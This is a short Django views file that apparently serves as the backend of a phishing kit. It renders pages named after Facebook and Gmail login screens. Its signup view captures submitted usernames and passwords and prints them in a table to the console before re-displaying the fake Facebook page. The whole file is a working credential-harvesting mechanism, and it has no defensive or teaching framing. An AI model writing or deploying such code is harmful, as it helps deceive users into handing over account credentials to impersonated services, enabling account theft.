from django.shortcuts import render

def facebook(request):
    return render(request, 'facebook.html')


def gmail(request):
    return render(request, 'gmail.html')

def signup(request):
    try:
        if request.POST['gmailUsername']:
            print("This is from gmail")
            return render(request, 'gmail2.html')
    except: 
        if request.method == 'POST': #User has info and wants an an account
            print("-"*62)
            print("|"+ " "*10+"Username"+ " "*12+ "  |" + " "*8+"Password"+ " "*11 + "|")
            print("-"*62)
            print("|       " + request.POST['username'] + "     |       " + request.POST['password']+ "          |")
            print("-"*62)
            return render(request, 'facebook.html')